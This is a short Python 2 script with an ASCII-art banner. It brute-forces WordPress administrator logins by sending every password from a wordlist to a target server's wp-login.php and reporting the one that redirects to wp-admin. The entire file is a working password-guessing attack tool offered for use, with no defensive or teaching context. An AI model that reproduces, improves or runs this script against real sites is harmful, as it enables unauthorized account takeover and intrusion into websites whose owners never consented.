#!/usr/bin/python
# coding=utf-8
import argparse
import urllib
import time
import urllib2
import os
if os.name == 'nt':
	os.system('cls')
else:	
	os.system('clear')
banner = """
 ██░ ██ ▓█████  ███▄ ▄███▓ ▄▄▄      
▓██░ ██▒▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    
▒██▀▀██░▒███   ▓██    ▓██░▒██  ▀█▄  
░▓█ ░██ ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ 
░▓█▒░██▓░▒████▒▒██▒   ░██▒ ▓█   ▓██▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░
 ▒ ░▒░ ░ ░ ░  ░░  ░      ░  ▒   ▒▒ ░
 ░  ░░ ░   ░   ░      ░     ░   ▒   
 ░  ░  ░   ░  ░       ░         ░  ░

"""
print'\033[92m' + banner

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user',help='username or admin')
parser.add_argument('-w','--wordlist',help='specify the wordlist')
parser.add_argument('-s','--server',help='server ip ex. 192.168.1.100 or www.example.com')
args = parser.parse_args()

url = 'http://' + args.server + '/wp-login.php' #(1)
user_login = args.user #(2)
wordlist = open(args.wordlist, 'r')
passwords = wordlist.readlines()
for password in passwords:
	password = password.strip()
	values = { 'log': user_login, 'pwd': password }
	data = urllib.urlencode(values)
	request = urllib2.Request(url, data)
	response = urllib2.urlopen(request)
	try:
		idx = response.geturl().index('wp-admin')
	except:
		idx = 0
	if idx > 0: #(6)
		print "\033[94mpassword found: " + "\033[92m[" + password + "]"
		break
	else:
		print "\033[31mfailed: " + "\033[93m[" + password + "]"

	wordlist.close()
